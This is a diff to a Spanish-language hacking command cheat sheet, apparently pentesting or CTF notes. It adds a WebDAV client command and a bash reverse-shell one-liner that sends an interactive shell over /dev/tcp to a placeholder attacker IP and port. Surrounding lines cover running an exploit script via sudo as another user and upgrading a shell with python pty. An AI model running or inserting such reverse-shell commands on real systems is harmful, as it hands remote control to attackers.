@@ -179,6 +179,7 @@ ssh -T git@github.com [probar conexion en git con ssh para autenticar]
 
 ftp (ip) [es un protocolo de transferencia de archivos que permite a los usuarios subir y descargar archivos de manera remota entre computadoras a través de una red]
 
+cadaver http://ip/webdav [permite interactuar con WebDAV como si fuera un servidor ftp]
 
 7. compilacion, analisis de archivos y binarios:
 
@@ -217,6 +218,8 @@ sudo -u (usuario) [permite ejecutar un comando con los permisos de un usuario di
 sudo -u (usuario) /usr/bin/python /direccion/exploit.py [ejecuta exploit.py como USUARIO utilizando la versión de Python especificada en la ruta]
 
 #!/bin/bash [le indica al sistema operativo qué intérprete usar para ejecutar el script]
+
+bash -c 'exec bash -i &>/dev/tcp/IpAtacante/Puerto <&1' [ejecuta una shell interactiva en el sistema víctima y redirige toda su entrada y salida a traves de una conexion TCP hacia la IP y puerto del atacante]
 
 python3 -c 'import pty;pty.spawn("/bin/bash");' [para invocar una shell si esta python3 instalado]
 
